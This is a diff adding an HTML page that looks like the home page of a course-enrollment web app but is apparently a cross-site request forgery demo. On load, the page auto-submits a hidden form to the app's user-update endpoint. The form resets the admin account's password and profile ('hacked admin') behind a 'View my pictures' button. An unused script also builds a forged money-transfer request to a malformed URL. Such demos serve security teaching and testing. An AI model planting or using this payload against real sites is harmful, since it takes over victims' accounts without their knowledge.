@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html xmlns:th="http://www.thymeleaf.org" lang="en" xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <meta charset="UTF-8"/>
+    <title>Home</title>
+</head>
+<body onload="document.forms[0].submit()">
+
+<div th:fragment="header">
+    <!-- this is header -->
+    <nav>
+        <a href="/">Home</a>
+    </nav>
+</div>
+
+<h1>Welcome!</h1>
+
+
+<nav>
+    <h4>Public</h4>
+    <ul>
+        <!--<li><a href="/">Home</a></li>-->
+        <li><a href="http://localhost:8080/user/register">Register</a></li>
+        <!--<li><a href="/login">Login</a></li>-->
+    </ul>
+    <h4>User</h4>
+    <ul>
+        <li><a href="http://localhost:8080/user/update">Update Account</a></li>
+        <li><a href="http://localhost:8080/user/view">View Account</a></li>
+        <li><a href="http://localhost:8080/course/enroll">Enroll to Course</a></li>
+        <li><a href="http://localhost:8080/course/enrollments">Enrolled Courses</a></li>
+        <li><a href="http://localhost:8080/user/list">View all users</a></li>
+        <!--<li><a href="/logout">Logout</a></li>-->
+    </ul>
+    <h4>Admin</h4>
+    <ul>
+        <li><a href="http://localhost:8080/admin/course/enrollments">Enrolled Courses</a></li>
+        <!--<li><a href="/logout">Logout</a></li>-->
+    </ul>
+</nav>
+
+<div class="container">
+
+    <footer>
+        <!-- this is footer -->|
+        <a href="http://localhost:8080/logout">Sign Out</a> |
+        <a href="http://localhost:8080/login">Sign in</a> |
+    </footer>
+</div>
+
+<script>
+    function put() {
+        var x = new XMLHttpRequest();
+        x.open("GET", "http:///transfer.do", true);
+        x.setRequestHeader("Content-Type", "application/json");
+        x.send(JSON.stringify({"acct": "BOB", "amount": 100}));
+    }
+</script>
+
+
+<hr/>
+
+<form action="http://localhost:8080/user/update" method="POST">
+    <input type="hidden" name="username" value="admin"/>
+    <input type="hidden" name="password" value="HelloWorld!"/>
+    <input type="hidden" name="fullname" value="hacked admin"/>
+    <input type="hidden" name="status" value="I got hacked."/>
+    <input type="submit" value="View my pictures"/>
+</form>
+
+</body>
+</html>
